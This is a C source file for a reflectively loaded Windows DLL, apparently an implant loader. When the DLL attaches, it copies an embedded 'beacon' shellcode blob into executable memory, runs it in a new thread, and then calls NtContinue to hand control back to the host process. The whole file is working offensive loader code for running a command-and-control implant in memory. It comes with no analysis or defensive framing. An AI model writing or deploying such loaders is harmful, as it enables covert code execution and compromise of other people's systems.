#include "ReflectiveLoader.h"

extern HINSTANCE hAppInstance;

#include <stdio.h>

#include "beacon.h"

typedef LONG (NTAPI * NtContinue_t)(PCONTEXT /* ctx */, BOOLEAN /* removealert */);

VOID WINAPI ExecuteShellcode()
{
	void *beacon = VirtualAlloc(0, beacon_bin_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	memcpy(beacon, beacon_bin, beacon_bin_len);

	((void(*)())beacon)();
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
	DWORD dwThreadId = 0;
    BOOL bReturnValue = TRUE;
	NtContinue_t pNtContinue;

	switch( dwReason )
    {
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
			{
				*(HMODULE *)lpReserved = hAppInstance;
			}
			break;

		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;

			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecuteShellcode, NULL, 0, &dwThreadId);

			pNtContinue = (NtContinue_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtContinue");

			if (!pNtContinue)
			{
				return FALSE;
			}

			pNtContinue((PCONTEXT)lpReserved, FALSE);

			break;

		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}